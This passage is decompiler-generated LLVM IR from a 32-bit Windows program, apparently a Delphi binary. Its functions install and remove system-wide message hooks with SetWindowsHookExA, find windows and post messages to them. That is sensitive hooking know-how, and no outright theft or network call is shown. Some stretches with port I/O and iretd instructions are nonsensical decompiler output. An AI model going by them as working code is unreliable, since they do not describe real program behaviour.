  %10 = inttoptr i32 %9 to i8*, !insn.addr !1099
  %11 = load i8, i8* %10, align 1, !insn.addr !1099
  %12 = load i32, i32* %eax, align 4, !insn.addr !1099
  %13 = trunc i32 %12 to i8, !insn.addr !1099
  %14 = add i8 %11, %13, !insn.addr !1099
  store i8 %14, i8* %10, align 1, !insn.addr !1099
  %15 = trunc i32 %3 to i16, !insn.addr !1100
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !1100
  %17 = inttoptr i32 %0 to i32*, !insn.addr !1100
  store i32 %16, i32* %17, align 4, !insn.addr !1100
  %18 = add i32 %0, 66, !insn.addr !1101
  %19 = inttoptr i32 %18 to i64*, !insn.addr !1101
  %20 = load i64, i64* %19, align 4, !insn.addr !1101
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !1101
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !1102
  %22 = load i8, i8* %5, align 4, !insn.addr !1103
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !1103
  %25 = add i8 %22, %24, !insn.addr !1103
  %26 = inttoptr i32 %23 to i8*, !insn.addr !1103
  store i8 %25, i8* %26, align 1, !insn.addr !1103
  %27 = add i32 %21, -117, !insn.addr !1104
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1104
  %29 = load i8, i8* %28, align 1, !insn.addr !1104
  %30 = trunc i32 %3 to i8, !insn.addr !1104
  %31 = add i8 %29, %30, !insn.addr !1104
  store i8 %31, i8* %28, align 1, !insn.addr !1104
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !1105
  %33 = add i32 %21, 16, !insn.addr !1106
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1106
  %35 = load i32, i32* %34, align 4, !insn.addr !1106
  %36 = add i32 %21, 12, !insn.addr !1107
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1107
  %38 = load i32, i32* %37, align 4, !insn.addr !1107
  %39 = add i32 %21, 8, !insn.addr !1108
  %40 = inttoptr i32 %39 to i32*, !insn.addr !1108
  %41 = load i32, i32* %40, align 4, !insn.addr !1108
  %42 = load i32, i32* inttoptr (i32 4227376 to i32*), align 16, !insn.addr !1109
  %43 = inttoptr i32 %42 to i32*, !insn.addr !1110
  %44 = load i32, i32* %43, align 4, !insn.addr !1110
  %45 = icmp eq i32 %44, 0, !insn.addr !1110
  %46 = icmp eq i1 %45, false, !insn.addr !1111
  %47 = icmp eq i32 %41, 0, !insn.addr !1112
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !1113
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_405e13, label %dec_label_pc_405e42, !insn.addr !1114

dec_label_pc_405e13:                              ; preds = %dec_label_pc_405ddd
  store i32 %35, i32* %eax, align 4, !insn.addr !1115
  %51 = add i32 %35, 4, !insn.addr !1116
  %52 = inttoptr i32 %51 to i32*, !insn.addr !1116
  %53 = load i32, i32* %52, align 4, !insn.addr !1116
  %54 = icmp eq i32 %53, 770, !insn.addr !1117
  br i1 %54, label %dec_label_pc_405e3b, label %dec_label_pc_405e42, !insn.addr !1118

dec_label_pc_405e3b:                              ; preds = %dec_label_pc_405e13
  %55 = call i32 @function_405c8c(i32 %2, i32 %1, i32 %0), !insn.addr !1119
  br label %dec_label_pc_405e42, !insn.addr !1119

dec_label_pc_405e42:                              ; preds = %dec_label_pc_405ddd, %dec_label_pc_405e13, %dec_label_pc_405e3b
  %56 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !1120
  %57 = inttoptr i32 %35 to i32*, !insn.addr !1121
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !1121
  ret i32 %58, !insn.addr !1122
}

define i32 @function_405e58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405e58:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_408130, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !1123
  %5 = icmp eq i1 %4, false, !insn.addr !1124
  %6 = icmp eq i32 %arg3, 0, !insn.addr !1125
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_405e76, label %dec_label_pc_405e88, !insn.addr !1126

dec_label_pc_405e76:                              ; preds = %dec_label_pc_405e58
  %8 = add i32 %arg1, 8, !insn.addr !1127
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1127
  %10 = load i32, i32* %9, align 4, !insn.addr !1127
  %11 = icmp eq i32 %10, 2, !insn.addr !1128
  %12 = icmp eq i1 %11, false, !insn.addr !1129
  br i1 %12, label %dec_label_pc_405e88, label %dec_label_pc_405e80, !insn.addr !1129

dec_label_pc_405e80:                              ; preds = %dec_label_pc_405e76
  %13 = call i32 @function_405d58(i32 %1, i32 %2, i32 %0), !insn.addr !1130
  br label %dec_label_pc_405e88, !insn.addr !1130

dec_label_pc_405e88:                              ; preds = %dec_label_pc_405e58, %dec_label_pc_405e80, %dec_label_pc_405e76
  %14 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1131
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !1132
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !1132
  ret i32 %16, !insn.addr !1133
}

define i32 @function_405ea0() local_unnamed_addr {
dec_label_pc_405ea0:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4218348 to i32*), i32 3), !insn.addr !1134
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1134
  store i32 %2, i32* @global_var_4096b8, align 4, !insn.addr !1135
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4218456 to i32*), i32 4), !insn.addr !1136
  %5 = ptrtoint i32* %4 to i32, !insn.addr !1136
  store i32 %5, i32* @global_var_4096bc, align 4, !insn.addr !1137
  ret i32 %5, !insn.addr !1138
}

define i32 @function_405ed8() local_unnamed_addr {
dec_label_pc_405ed8:
  %0 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !1139
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1140
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1140
  %3 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1141
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1142
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !1142
  %6 = sext i1 %5 to i32, !insn.addr !1142
  ret i32 %6, !insn.addr !1143
}

define i32 @function_405ef0() local_unnamed_addr {
dec_label_pc_405ef0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1144
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1144
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1144
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1145
  %2 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1146
  %3 = add i32 %2, 1, !insn.addr !1146
  store i32 %3, i32* @global_var_4096b4, align 4, !insn.addr !1146
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1147
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1148
  ret i32 0, !insn.addr !1149
}

define i32 @function_405f15() local_unnamed_addr {
dec_label_pc_405f15:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1150
  ret i32 %0, !insn.addr !1150
}

define i32 @function_405f1a() local_unnamed_addr {
dec_label_pc_405f1a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1151
}

define i32 @function_405f1c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f1c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1152
}

define i32 @function_405f20() local_unnamed_addr {
dec_label_pc_405f20:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1153
  %2 = add i32 %1, -1, !insn.addr !1153
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1153
  ret i32 %0, !insn.addr !1154
}

define i32 @function_405f28() local_unnamed_addr {
dec_label_pc_405f28:
  %esp.0.reg2mem = alloca i32, !insn.addr !1155
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1156
  %2 = icmp eq i32 %0, 0, !insn.addr !1157
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1158
  br i1 %2, label %dec_label_pc_406032, label %dec_label_pc_405f42, !insn.addr !1158

dec_label_pc_405f42:                              ; preds = %dec_label_pc_405f28
  %3 = call i32 @function_4036c8(), !insn.addr !1159
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1160
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1160
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1160
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1161
  %7 = icmp eq i1 %6, false, !insn.addr !1162
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1163
  br i1 %7, label %dec_label_pc_406032, label %dec_label_pc_405f5d, !insn.addr !1163

dec_label_pc_405f5d:                              ; preds = %dec_label_pc_405f42
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_406040 to i32*), i8* null, i8* %8), !insn.addr !1164
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1164
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1165
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1165
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1166
  %13 = icmp eq i1 %12, false, !insn.addr !1167
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1168
  br i1 %13, label %dec_label_pc_406032, label %dec_label_pc_405f86, !insn.addr !1168

dec_label_pc_405f86:                              ; preds = %dec_label_pc_405f5d
  %14 = call i32 @function_4034c8(), !insn.addr !1169
  %15 = add i32 %14, 22, !insn.addr !1170
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1171
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1171
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1172
  %18 = icmp eq i32* %17, null, !insn.addr !1173
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1174
  br i1 %18, label %dec_label_pc_406032, label %dec_label_pc_405fa5, !insn.addr !1174

dec_label_pc_405fa5:                              ; preds = %dec_label_pc_405f86
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1175
  %20 = icmp eq i32* %19, null, !insn.addr !1176
  %21 = icmp eq i1 %20, false, !insn.addr !1177
  br i1 %21, label %dec_label_pc_405fb9, label %dec_label_pc_405fb1, !insn.addr !1177

dec_label_pc_405fb1:                              ; preds = %dec_label_pc_405fa5
  %22 = bitcast i32* %17 to i8*, !insn.addr !1178
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1178
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1178
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1179
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1180
  br label %dec_label_pc_406032, !insn.addr !1180

dec_label_pc_405fb9:                              ; preds = %dec_label_pc_405fa5
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1172
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1175
  store i32 20, i32* %19, align 4, !insn.addr !1181
  %27 = add i32 %26, 4, !insn.addr !1182
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1182
  store i32 0, i32* %28, align 4, !insn.addr !1182
  %29 = add i32 %26, 8, !insn.addr !1183
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1183
  store i32 0, i32* %30, align 4, !insn.addr !1183
  %31 = add i32 %26, 12, !insn.addr !1184
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1184
  store i32 0, i32* %32, align 4, !insn.addr !1184
  %33 = add i32 %26, 16, !insn.addr !1185
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1185
  store i32 0, i32* %34, align 4, !insn.addr !1185
  %35 = call i32 @function_4036c8(), !insn.addr !1186
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1187
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1187
  %37 = add i32 %26, 20, !insn.addr !1188
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1189
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1190
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1191
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1192
  %42 = call i32 @function_406edc(i32 4218952, i32 2000, i32 -1), !insn.addr !1193
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1194
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1194
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1195
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1195
  %46 = icmp eq i1 %45, false, !insn.addr !1196
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1197
  br i1 %46, label %dec_label_pc_406032, label %dec_label_pc_406023, !insn.addr !1197

dec_label_pc_406023:                              ; preds = %dec_label_pc_405fb9
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1198
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1198
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1199
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1199
  br label %dec_label_pc_406032, !insn.addr !1199

dec_label_pc_406032:                              ; preds = %dec_label_pc_406023, %dec_label_pc_405fb9, %dec_label_pc_405fb1, %dec_label_pc_405f86, %dec_label_pc_405f5d, %dec_label_pc_405f42, %dec_label_pc_405f28
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1200
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1200
  %51 = load i32, i32* %50, align 4, !insn.addr !1200
  ret i32 %51, !insn.addr !1201
}

define i32 @function_40603d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_40603d:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1202
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1202
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1202
  store i8 %6, i8* %7, align 1, !insn.addr !1202
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1203
  %10 = udiv i32 %4, 256, !insn.addr !1203
  %11 = trunc i32 %10 to i8, !insn.addr !1203
  %12 = add i8 %9, %11, !insn.addr !1203
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1203
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1203
  store i8 %12, i8* %14, align 1, !insn.addr !1203
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1204
  %17 = add i32 %4, 6, !insn.addr !1204
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1204
  %19 = zext i1 %16 to i32, !insn.addr !1204
  %20 = and i32 %4, -65536, !insn.addr !1204
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1205
  %23 = or i1 %16, %22, !insn.addr !1205
  %24 = add i32 %18, 6, !insn.addr !1205
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1205
  %26 = zext i1 %23 to i32, !insn.addr !1205
  %27 = and i32 %25, 15, !insn.addr !1205
  %28 = or i32 %27, %20, !insn.addr !1205
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1205
  %31 = or i32 %28, %30, !insn.addr !1205
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1206
  %33 = load i8, i8* %32, align 1, !insn.addr !1206
  %34 = trunc i32 %27 to i8, !insn.addr !1206
  %35 = xor i8 %33, %34, !insn.addr !1206
  store i8 %35, i8* %32, align 1, !insn.addr !1206
  %36 = add i32 %0, 1311123697, !insn.addr !1207
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1207
  %38 = load i8, i8* %37, align 1, !insn.addr !1207
  %39 = udiv i32 %3, 256, !insn.addr !1207
  %40 = trunc i32 %39 to i8, !insn.addr !1207
  %41 = add i8 %38, %40, !insn.addr !1207
  store i8 %41, i8* %37, align 1, !insn.addr !1207
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1208
  %43 = load i32, i32* %42, align 4, !insn.addr !1208
  %44 = sub i32 %43, %31, !insn.addr !1208
  store i32 %44, i32* %42, align 4, !insn.addr !1208
  %45 = add i32 %3, 117, !insn.addr !1209
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1209
  %47 = load i8, i8* %46, align 1, !insn.addr !1209
  %48 = add i8 %47, %34, !insn.addr !1209
  %49 = icmp eq i8 %48, 0, !insn.addr !1209
  store i8 %48, i8* %46, align 1, !insn.addr !1209
  br i1 %49, label %dec_label_pc_4060c8, label %dec_label_pc_406054, !insn.addr !1210

dec_label_pc_406054:                              ; preds = %dec_label_pc_40603d
  %50 = xor i32 %3, %1, !insn.addr !1211
  %51 = trunc i32 %3 to i16, !insn.addr !1212
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1212
  %53 = load i32, i32* %52, align 4, !insn.addr !1212
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1212
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1213
  %55 = load i8, i8* %54, align 1, !insn.addr !1213
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1213
  %56 = load i8, i8* %32, align 1, !insn.addr !1214
  %57 = add i8 %56, %34, !insn.addr !1214
  store i8 %57, i8* %32, align 1, !insn.addr !1214
  %58 = call i32 @__asm_iretd(), !insn.addr !1215
  %59 = add i32 %2, -117, !insn.addr !1216
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1216
  %61 = load i8, i8* %60, align 1, !insn.addr !1216
  %62 = add i8 %61, -69, !insn.addr !1216
  store i8 %62, i8* %60, align 1, !insn.addr !1216
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1217
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1218
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1218
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1218
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1219
  %66 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1220
  %67 = add i32 %66, 1, !insn.addr !1220
  store i32 %67, i32* @global_var_4096c0, align 4, !insn.addr !1220
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1221
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1222
  ret i32 0, !insn.addr !1223

dec_label_pc_4060c8:                              ; preds = %dec_label_pc_40603d
  %69 = call i32 @function_403c90(), !insn.addr !1224
  store i32 %69, i32* %ebx, align 4, !insn.addr !1225
  %70 = icmp slt i32 %69, 0, !insn.addr !1226
  br i1 %70, label %dec_label_pc_4060f0, label %dec_label_pc_4060d8, !insn.addr !1227

dec_label_pc_4060d8:                              ; preds = %dec_label_pc_4060c8
  %71 = add i32 %69, 1, !insn.addr !1228
  store i32 %71, i32* %ebx, align 4, !insn.addr !1228
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1229
  br label %dec_label_pc_406131

dec_label_pc_4060f0:                              ; preds = %dec_label_pc_4060c8
  %73 = call i32 @function_403c88(), !insn.addr !1230
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1231
  %75 = call i32 @function_403c90(), !insn.addr !1232
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1233
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1234
  br label %dec_label_pc_406131, !insn.addr !1234

dec_label_pc_406131:                              ; preds = %dec_label_pc_4060d8, %dec_label_pc_4060f0
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1235
}

define i32 @function_406138() local_unnamed_addr {
dec_label_pc_406138:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1236
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1236
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1236
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1237
  %2 = load i32, i32* @global_var_4096c4, align 4, !insn.addr !1238
  %3 = add i32 %2, 1, !insn.addr !1238
  %4 = icmp eq i32 %3, 0, !insn.addr !1238
  store i32 %3, i32* @global_var_4096c4, align 4, !insn.addr !1238
  %5 = icmp eq i1 %4, false, !insn.addr !1239
  br i1 %5, label %dec_label_pc_406161, label %dec_label_pc_406151, !insn.addr !1239

dec_label_pc_406151:                              ; preds = %dec_label_pc_406138
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1240
  br label %dec_label_pc_406161, !insn.addr !1240

dec_label_pc_406161:                              ; preds = %dec_label_pc_406151, %dec_label_pc_406138
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1241
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1242
  ret i32 0, !insn.addr !1243
}

define i32 @function_40616f() local_unnamed_addr {
dec_label_pc_40616f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1244
  ret i32 %0, !insn.addr !1244
}

define i32 @function_406174() local_unnamed_addr {
dec_label_pc_406174:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1245
}

define i32 @function_406176(i32 %arg1) local_unnamed_addr {
dec_label_pc_406176:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1246
}

define i32 @function_406178() local_unnamed_addr {
dec_label_pc_406178:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1247
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1247
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1247
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1248
  %2 = load i32, i32* @global_var_4096c4, align 4, !insn.addr !1249
  %3 = add i32 %2, -1, !insn.addr !1249
  %4 = icmp eq i32 %2, 0, !insn.addr !1249
  store i32 %3, i32* @global_var_4096c4, align 4, !insn.addr !1249
  %5 = icmp eq i1 %4, false, !insn.addr !1250
  br i1 %5, label %dec_label_pc_4061ac, label %dec_label_pc_406192, !insn.addr !1250

dec_label_pc_406192:                              ; preds = %dec_label_pc_406178
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1251
  br label %dec_label_pc_4061ac, !insn.addr !1252

dec_label_pc_4061ac:                              ; preds = %dec_label_pc_406192, %dec_label_pc_406178
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1253
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1254
  ret i32 0, !insn.addr !1255
}

define i32 @function_4061ba() local_unnamed_addr {
dec_label_pc_4061ba:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1256
  ret i32 %0, !insn.addr !1256
}

define i32 @function_4061bf() local_unnamed_addr {
dec_label_pc_4061bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1257
}

define i32 @function_4061c1(i32 %arg1) local_unnamed_addr {
dec_label_pc_4061c1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1258
}

define i32 @function_4061c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4061c4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = and i32 %0, -256, !insn.addr !1259
  %2 = or i32 %1, 244, !insn.addr !1260
  ret i32 %2, !insn.addr !1261
}

define i32 @function_4061cb(i32 %arg1) local_unnamed_addr {
dec_label_pc_4061cb:
  %esp.1.reg2mem = alloca i32, !insn.addr !1262
  %esp.0.reg2mem = alloca i32, !insn.addr !1262
  %zf.0.reg2mem = alloca i1, !insn.addr !1262
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = sub i32 %1, %0, !insn.addr !1262
  %4 = xor i32 %1, %0, !insn.addr !1262
  %5 = xor i32 %3, %1, !insn.addr !1262
  %6 = and i32 %5, %4, !insn.addr !1262
  %7 = icmp slt i32 %6, 0, !insn.addr !1262
  %8 = trunc i32 %2 to i8, !insn.addr !1263
  %9 = udiv i32 %2, 256, !insn.addr !1263
  %10 = trunc i32 %9 to i8, !insn.addr !1263
  %11 = mul i8 %10, -43, !insn.addr !1263
  %12 = add i8 %11, %8, !insn.addr !1263
  %13 = icmp eq i8 %12, 0, !insn.addr !1263
  store i1 %13, i1* %zf.0.reg2mem, !insn.addr !1264
  br i1 %7, label %dec_label_pc_40623a, label %dec_label_pc_4061d1, !insn.addr !1264

dec_label_pc_4061d1:                              ; preds = %dec_label_pc_4061cb
  %14 = and i32 %2, -65536, !insn.addr !1263
  %15 = zext i8 %12 to i32, !insn.addr !1263
  %16 = or i32 %14, %15, !insn.addr !1263
  %17 = inttoptr i32 %16 to i8*, !insn.addr !1265
  %18 = load i8, i8* %17, align 1, !insn.addr !1265
  %factor = mul i8 %12, 27
  %19 = add i8 %18, %factor, !insn.addr !1266
  store i8 %19, i8* %17, align 1, !insn.addr !1266
  store i32 0, i32* %stack_var_-16, align 4, !insn.addr !1267
  %20 = call i32 @__readfsdword(i32 0), !insn.addr !1268
  store i32 %20, i32* %stack_var_-48, align 4, !insn.addr !1268
  %21 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1268
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1269
  store i32 %arg1, i32* %stack_var_-56, align 4, !insn.addr !1270
  %22 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1270
  %23 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1271
  %24 = icmp eq i32 %23, 32770, !insn.addr !1272
  store i1 %24, i1* %zf.0.reg2mem, !insn.addr !1272
  store i32 %22, i32* %esp.0.reg2mem, !insn.addr !1272
  br label %dec_label_pc_40623a, !insn.addr !1272

dec_label_pc_40623a:                              ; preds = %dec_label_pc_4061d1, %dec_label_pc_4061cb
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %zf.0.reload = load i1, i1* %zf.0.reg2mem
  %25 = icmp eq i1 %zf.0.reload, false, !insn.addr !1273
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !1273
  br i1 %25, label %dec_label_pc_4062ec, label %dec_label_pc_406240, !insn.addr !1273

dec_label_pc_406240:                              ; preds = %dec_label_pc_40623a
  %26 = call i32 @function_406fd0(), !insn.addr !1274
  %27 = call i32 @"@LStrPos"(), !insn.addr !1275
  %28 = call i32 @"@LStrPos"(), !insn.addr !1276
  %29 = add i32 %28, -1, !insn.addr !1277
  %30 = icmp slt i32 %29, 0, !insn.addr !1278
  %31 = add i32 %27, 2, !insn.addr !1279
  %32 = icmp sgt i32 %31, %29, !insn.addr !1280
  %or.cond = or i1 %30, %32
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !1281
  br i1 %or.cond, label %dec_label_pc_4062ec, label %dec_label_pc_406274, !insn.addr !1281

dec_label_pc_406274:                              ; preds = %dec_label_pc_406240
  %33 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1282
  store i32 %33, i32* %stack_var_-60, align 4, !insn.addr !1282
  %34 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1282
  %35 = call i32 @"@LStrCopy"(), !insn.addr !1283
  %36 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1284
  %37 = icmp eq i32 %36, 0, !insn.addr !1284
  store i32 %34, i32* %esp.1.reg2mem, !insn.addr !1285
  br i1 %37, label %dec_label_pc_4062ec, label %dec_label_pc_40629c, !insn.addr !1285

dec_label_pc_40629c:                              ; preds = %dec_label_pc_406274
  %38 = call i32 @function_406db8(), !insn.addr !1286
  %39 = call i32 @"@LStrFromPChar"(), !insn.addr !1287
  %40 = call i32 @"@LStrCat"(), !insn.addr !1288
